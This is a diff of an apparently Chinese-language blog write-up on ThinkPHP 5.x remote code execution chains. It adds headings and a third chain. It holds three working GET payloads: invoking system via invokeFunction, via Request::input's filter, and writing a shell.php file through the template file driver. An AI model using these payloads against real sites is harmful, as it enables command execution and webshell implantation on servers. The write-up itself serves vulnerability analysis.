@@ -111,7 +111,7 @@
 
                 <p>&nbsp;&nbsp;&nbsp;5.0.23 <= 5.x <= 5.1.31</p>
 
-                <h2 class="section-heading">利用链</h2>
+                <h2 class="section-heading">利用链1</h2>
                 
                 <p>&nbsp;&nbsp;&nbsp;利用点位于
                 	thinkphp/library/think/Container.php::invokeFunction()</p>
@@ -250,13 +250,15 @@
                 </a>
                 
 
-                <h2 class="section-heading">POP-1</h2>
+                <h2 class="section-heading">POC-1</h2>
 
                 <div>
 
                     <pre class='hljs'><code>GET: s=index/think\App/invokeFunction&amp;function=call<span class="hljs-emphasis">_user_</span>func_array&amp;vars[<span class="hljs-link_label">0</span>]=system&amp;vars[<span class="hljs-link_label">1</span>][<span class="hljs-link_reference"></span>]=ls</code></pre>
 
                 </div>
+                
+                <h2 class="section-heading">利用链2</h2>
                 
                 <p>&nbsp;&nbsp;&nbsp;既然这里通过路由可以实例化类跟调用方法，那么只要找到其它触发点即可构成POP链。
                 	回到TP5.0.x的rce链，找到thinkphp/library/think/Request.php::input()。</p>
@@ -273,11 +275,27 @@
                 
 
 
-								<h2 class="section-heading">POP-2</h2>
+								<h2 class="section-heading">POC-2</h2>
 								
 								<div>
 									
 									<pre class='hljs'><code>GET: s=index/\think\request/input?data[]=<span class="hljs-keyword">ls</span>&amp;<span class="hljs-keyword">filter</span>=<span class="hljs-keyword">system</span></code></pre>
+									
+								</div>
+								
+								<h2 class="section-heading">利用链3</h2>
+								
+								<p>&nbsp;&nbsp;&nbsp;在thinkphp/library/think/template/driver/File.php::write()也有一个file_put_contents()可以用来写shell。</p>
+                	                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-23/pop-3-1.jpg" alt="">
+                </a>
+								
+								
+								<h2 class="section-heading">POC-3</h2>
+								<div>
+									
+									<pre class='hljs'><code><span class="hljs-type">GET</span>: s=index/\think\<span class="hljs-keyword">template</span>\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php+phpinfo();?&gt;</code></pre>
 									
 								</div>
 
